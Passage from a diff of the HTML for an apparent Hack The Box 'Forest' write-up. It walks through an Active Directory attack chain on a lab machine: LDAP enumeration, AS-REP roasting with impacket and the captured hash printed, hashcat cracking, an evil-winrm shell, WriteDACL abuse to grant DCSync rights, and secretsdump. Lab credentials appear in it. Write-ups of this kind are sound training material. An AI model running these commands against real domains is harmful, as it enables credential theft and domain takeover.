     class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
     title="Copy code"
@@ -516,14 +657,11 @@ Service detection performed. Please report any incorrect results at https://nmap
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <p><strong>R1: htb.local</strong></p>
 <h3>Q2: Which of the following services allows for anonymous authentication and can provide us with valuable information about the machine? FTP, LDAP, SMB, WinRM<span class="hx-absolute -hx-mt-20" id="q2-which-of-the-following-services-allows-for-anonymous-authentication-and-can-provide-us-with-valuable-information-about-the-machine-ftp-ldap-smb-winrm"></span>
     <a href="#q2-which-of-the-following-services-allows-for-anonymous-authentication-and-can-provide-us-with-valuable-information-about-the-machine-ftp-ldap-smb-winrm" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>Attempting SMB</p>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
 <div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ smbclient -L 10.129.95.210 -U guest</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
@@ -534,14 +672,11 @@ Service detection performed. Please report any incorrect results at https://nmap
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
-<pre><code>Password for [WORKGROUP\guest]:
-session setup failed: NT_STATUS_ACCOUNT_DISABLED</code></pre><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+<div><pre><code>Password for [WORKGROUP\guest]:
+session setup failed: NT_STATUS_ACCOUNT_DISABLED</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
     class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
     title="Copy code"
@@ -550,12 +685,9 @@ session setup failed: NT_STATUS_ACCOUNT_DISABLED</code></pre><div class="hextra-
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <p>Attempting LDAP</p>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
 <div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ldapsearch -H ldap://10.129.36.185:389/ -x -b <span style="color:#e6db74">&#39;dc=htb,dc=local&#39;</span> <span style="color:#e6db74">&#34;(objectClass=*)&#34;</span> *</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
@@ -566,13 +698,10 @@ session setup failed: NT_STATUS_ACCOUNT_DISABLED</code></pre><div class="hextra-
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
-<pre><code># extended LDIF
+<div><pre><code># extended LDIF
 #
 # LDAPv3
 # base &lt;dc=htb,dc=local&gt; with scope subtree
@@ -594,7 +723,7 @@ dn: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
 
 # Read-only Domain Controllers, Users, htb.local
 
-...</code></pre><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+...</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
     class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
     title="Copy code"
@@ -603,14 +732,11 @@ dn: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <p><strong>R2: LDAP</strong></p>
 <h3>Q3: Which user has Kerberos Pre-Authentication disabled?<span class="hx-absolute -hx-mt-20" id="q3-which-user-has-kerberos-pre-authentication-disabled"></span>
     <a href="#q3-which-user-has-kerberos-pre-authentication-disabled" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>Took a while to craft this query:</p>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
 <div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ldapsearch -H ldap://10.129.36.185:389/ -x -b <span style="color:#e6db74">&#39;ou=Employees,dc=htb,dc=local&#39;</span> <span style="color:#e6db74">&#34;(&amp;(objectClass=user)(objectClass=person))&#34;</span> +</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
@@ -621,13 +747,10 @@ dn: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
-<pre><code># extended LDIF
+<div><pre><code># extended LDIF
 #
 # LDAPv3
 # base &lt;ou=Employees,dc=htb,dc=local&gt; with scope subtree
@@ -661,7 +784,7 @@ search: 2
 result: 0 Success
 
 # numResponses: 6
-# numEntries: 5</code></pre><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+# numEntries: 5</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
     class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
     title="Copy code"
@@ -670,12 +793,9 @@ result: 0 Success
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <p>After that, I also tried many other ldapsearch queries in order to find the right user, but only managed to do so by running enum4linux later, with all basic enumeration. Here is the one I thought would be the most promising:</p>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
 <div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ldapsearch -H ldap://10.129.36.185:389/ -x -b <span style="color:#e6db74">&#39;dc=htb,dc=local&#39;</span> <span style="color:#e6db74">&#34;(objectClass=user)&#34;</span>| grep <span style="color:#e6db74">&#34;sAMAccountName: &#34;</span> | sed s/<span style="color:#e6db74">&#34;sAMAccountName: &#34;</span>//g | cat -n</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
@@ -686,13 +806,10 @@ result: 0 Success
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
-<pre><code>     1  Guest
+<div><pre><code>     1  Guest
      2  DefaultAccount
      3  FOREST$
      4  EXCH01$
@@ -721,7 +838,7 @@ result: 0 Success
     27  lucinda
     28  andy
     29  mark
-    30  santi</code></pre><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+    30  santi</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
     class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
     title="Copy code"
@@ -730,13 +847,10 @@ result: 0 Success
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <p>However, when trying to run <code>impacket-GetNPUsers</code> with those usernames, it&rsquo;s output stated that none of the accounts had the <code>UF_DONT_REQUIRE_PREAUTH</code> property set.</p>
 <p>Then I tried enum4linux:</p>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
 <div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ enum4linux -a 10.129.95.210 | tee enum4linux.out</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
@@ -747,8 +861,6 @@ result: 0 Success
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <p><img src="image-1.png" alt="alt text" loading="lazy" /></p>
 <p>Why didn&rsquo;t I find that user in any of my <code>ldapsearch</code> queries?</p>
@@ -756,7 +868,6 @@ result: 0 Success
 <p><img src="image-2.png" alt="alt text" loading="lazy" /></p>
 <p>Following with my solve, I included that username in my list and tried running the impacket script again.</p>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
 <div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ impacket-GetNPUsers htb.local/ -dc-ip 10.129.36.185 -outputfile hash.txt -format hashcat -usersfile usernames-custom.txt</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
@@ -767,13 +878,10 @@ result: 0 Success
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
-<pre><code>Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+<div><pre><code>Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
@@ -805,7 +913,7 @@ result: 0 Success
 [-] User andy doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
 [-] User mark doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
 [-] User santi doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
-$krb5asrep$23$svc-alfresco@HTB.LOCAL:b7292cee1a66a28f8b67fb064553a38d$663f567fbc37b84a525e6761682e354a1d4c13e10db57d41d194e13301528c48b687200a8e00d7f6e0c117d54c7034502075391ba970b0dce19868c6a0c9d2d9ddceb96c051955d3e168b198e9021f9f0b2132be9dcd46fb1b90edd2e7f40cb091ae8f0c7c833807621948aa3a7cfa9e6f2f078203f3bb2cbab21585d42655753259a0e5aa1245dab21b363e9e9fd3f1fad5919b09e4f9065a458a7b9df001af31681d01d15f220e02d4f2f69efb1cb41eb0ec63e4b749bdb1e30fa710ea2a159a603e69cd990fa1bc29eae7e08fd8cf91ac02f03793028b1bae9814571efa251e829371f327</code></pre><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:b7292cee1a66a28f8b67fb064553a38d$663f567fbc37b84a525e6761682e354a1d4c13e10db57d41d194e13301528c48b687200a8e00d7f6e0c117d54c7034502075391ba970b0dce19868c6a0c9d2d9ddceb96c051955d3e168b198e9021f9f0b2132be9dcd46fb1b90edd2e7f40cb091ae8f0c7c833807621948aa3a7cfa9e6f2f078203f3bb2cbab21585d42655753259a0e5aa1245dab21b363e9e9fd3f1fad5919b09e4f9065a458a7b9df001af31681d01d15f220e02d4f2f69efb1cb41eb0ec63e4b749bdb1e30fa710ea2a159a603e69cd990fa1bc29eae7e08fd8cf91ac02f03793028b1bae9814571efa251e829371f327</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
     class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
     title="Copy code"
@@ -814,15 +922,12 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:b7292cee1a66a28f8b67fb064553a38d$663f567fbc
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <p>By that output, we can notice that many of the usernames could&rsquo;ve been excluded from my list.</p>
 <p>This technique is known as AS-REP Roasting.</p>
 <p><strong>R3: svc-alfresco</strong></p>
 <h3>Q4: What is the password of the user svc-alfresco?<span class="hx-absolute -hx-mt-20" id="q4-what-is-the-password-of-the-user-svc-alfresco"></span>
     <a href="#q4-what-is-the-password-of-the-user-svc-alfresco" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
 <div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ hashcat -a <span style="color:#ae81ff">0</span> hash.txt /usr/share/wordlists/rockyou.txt</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
@@ -833,15 +938,12 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:b7292cee1a66a28f8b67fb064553a38d$663f567fbc
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <p><img src="image-3.png" alt="alt text" loading="lazy" /></p>
 <p><strong>R4: s3rvice</strong></p>
 <h3>Q5: To what port can we connect with these creds to get an interactive shell?<span class="hx-absolute -hx-mt-20" id="q5-to-what-port-can-we-connect-with-these-creds-to-get-an-interactive-shell"></span>
     <a href="#q5-to-what-port-can-we-connect-with-these-creds-to-get-an-interactive-shell" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>As I wasn&rsquo;t sure if any of the ports I&rsquo;d found in the initial nmap scan could be hosting some kind of remote shell service, I decided to run another one through all of the TCP ports in the host.</p>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
 <div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat nmap/complete.nmap</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
@@ -852,13 +954,10 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:b7292cee1a66a28f8b67fb064553a38d$663f567fbc
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
-<pre><code># Nmap 7.94SVN scan initiated Tue Jul 30 00:38:14 2024 as: nmap -sCV -p- --min-rate=1000 -oN nmap/complete.nmap 10.129.36.185
+<div><pre><code># Nmap 7.94SVN scan initiated Tue Jul 30 00:38:14 2024 as: nmap -sCV -p- --min-rate=1000 -oN nmap/complete.nmap 10.129.36.185
 Increasing send delay for 10.129.36.185 from 320 to 640 due to 89 out of 295 dropped probes since last increase.
 Warning: 10.129.36.185 giving up on port because retransmission cap hit (10).
 Nmap scan report for htb.local (10.129.36.185)
@@ -896,7 +995,7 @@ PORT      STATE SERVICE      VERSION
 49925/tcp open  msrpc        Microsoft Windows RPC
 Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
 
-...</code></pre><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+...</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
     class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
     title="Copy code"
@@ -905,8 +1004,6 @@ Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <p>None of these seemed like an obvious remote access service to me, so I&rsquo;ve decided to take a look at the hint, which said that it would be interesting to check if WinRM was open.</p>
 <p>After googling &ldquo;winrm&rdquo;, I noticed that it used <code>5985</code> as it&rsquo;s default port, which we found open in the nmap scan.</p>
@@ -914,7 +1011,6 @@ Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
 <p>I&rsquo;ve found a couple of solutions to connect to the machine at this point. The most simple seemed to be using straight PowerShell, which comes pre-installed on Kali as pwsh,  and then connecting to the remote machine using the <code>Enter-PSSession</code> command. That didn&rsquo;t work, so used Evil-WinRM instead.</p>
 <p><img src="image-4.png" alt="alt text" loading="lazy" /></p>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
 <div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\svc-alfresco\Documents&gt; ls C:\Users</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
@@ -925,13 +1021,10 @@ Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
-<pre><code>    Directory: C:\Users
+<div><pre><code>    Directory: C:\Users
 
 
 Mode                LastWriteTime         Length Name
@@ -939,7 +1032,7 @@ Mode                LastWriteTime         Length Name
 d-----        9/18/2019  10:09 AM                Administrator
 d-r---       11/20/2016   6:39 PM                Public
 d-----        9/22/2019   3:29 PM                sebastien
-d-----        9/22/2019   4:02 PM                svc-alfresco</code></pre><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+d-----        9/22/2019   4:02 PM                svc-alfresco</code></pre></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
     class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
     title="Copy code"
@@ -948,8 +1041,6 @@ d-----        9/22/2019   4:02 PM                svc-alfresco</code></pre><div c
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <h2>Root<span class="hx-absolute -hx-mt-20" id="root"></span>
     <a href="#root" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><h3>Q6: Which group has WriteDACL permissions over the HTB.LOCAL domain? Give the group name without the @htb.local.<span class="hx-absolute -hx-mt-20" id="q6-which-group-has-writedacl-permissions-over-the-htblocal-domain-give-the-group-name-without-the-htblocal"></span>
@@ -973,7 +1064,6 @@ d-----        9/22/2019   4:02 PM                svc-alfresco</code></pre><div c
 <p><img src="image-8.png" alt="alt text" loading="lazy" /></p>
 <p>Then, I added my user to the &ldquo;Remote Management Users&rdquo; group, in order to be able to access it with <code>evil-winrm</code>.</p>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
 <div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\svc-alfresco\Documents&gt; Add-DomainGroupMember -Identity <span style="color:#e6db74">&#34;Remote Management Users&#34;</span> -Members zetsu</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
@@ -984,12 +1074,9 @@ d-----        9/22/2019   4:02 PM                svc-alfresco</code></pre><div c
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <p>Finally, added the account to the target group.</p>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
 <div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\svc-alfresco\Documents&gt; Add-DomainGroupMember -Identity <span style="color:#e6db74">&#34;Exchange Windows Permissions&#34;</span> -Members zetsu</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
@@ -1000,8 +1087,6 @@ d-----        9/22/2019   4:02 PM                svc-alfresco</code></pre><div c
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <p>Now we can connect to our user in a new WinRM session.</p>
 <p><img src="image-9.png" alt="alt text" loading="lazy" /></p>
@@ -1012,7 +1097,6 @@ d-----        9/22/2019   4:02 PM                svc-alfresco</code></pre><div c
 <p>From the <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync" target="_blank" rel="noopener">HackTricks page</a>: &ldquo;The DCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.&rdquo;</p>
 <p>What the WriteDACL permission allows us to do here is granting ourselves the permissions over the domain that are necessary to perform a DCSync attack. We can do so with PowerView.</p>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
 <div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\zetsu\Documents&gt; $SecPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;chinforinfola&#39;</span> -AsPlainText -Force
 </span></span><span style="display:flex;"><span>PS C:\Users\zetsu\Documents&gt; $Cred = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;HTB\zetsu&#39;</span>, $SecPassword)
@@ -1025,12 +1109,9 @@ d-----        9/22/2019   4:02 PM                svc-alfresco</code></pre><div c
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <p>Now, we can use <code>secretsdump.py</code> to perform the actual attack.</p>
 <div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
-  
 
 <div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ secretsdump.py -just-dc &lt;username&gt;:&lt;password&gt;@&lt;target-ip&gt; -outputfile &lt;filename&gt;</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
   <button
@@ -1041,8 +1122,6 @@ d-----        9/22/2019   4:02 PM                svc-alfresco</code></pre><div c
     <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
   </button>
 </div>
-
-  
 </div>
 <p><img src="image-11.png" alt="alt text" loading="lazy" /></p>
 <p>Getting Administrator NT hash. Check <a href="https://en.wikipedia.org/wiki/NTLM" target="_blank" rel="noopener">this WikiPedia article</a> for reference on the hash format.</p>
@@ -1065,21 +1144,17 @@ d-----        9/22/2019   4:02 PM                svc-alfresco</code></pre><div c
   </div>
 
       <footer class="hextra-footer hx-bg-gray-100 hx-pb-[env(safe-area-inset-bottom)] dark:hx-bg-neutral-900 print:hx-bg-transparent"><div
-    class="hx-max-w-screen-xl hx-mx-auto hx-flex hx-justify-center hx-py-12 hx-pl-[max(env(safe-area-inset-left),1.5rem)] hx-pr-[max(env(safe-area-inset-right),1.5rem)] hx-text-gray-600 dark:hx-text-gray-400 md:hx-justify-start"
-  >
